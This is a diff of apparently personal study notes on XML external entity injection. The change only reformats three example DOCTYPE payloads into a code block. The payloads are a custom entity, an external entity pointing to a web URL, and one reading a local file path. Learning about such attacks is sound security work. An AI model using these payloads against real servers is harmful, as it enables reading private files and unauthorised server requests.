@@ -18,6 +18,8 @@
 
 1. Just a way that **inject** malicious payload to **XML request**, **forces** the server **XML parser** **execute** our malicious code in the injection payload.
 2. Create an custom enit --> put it in any tags in XML request --> check if the result appear in the response
-`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`
-`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`
-`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`
+```
+<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
+<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
+<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
+```
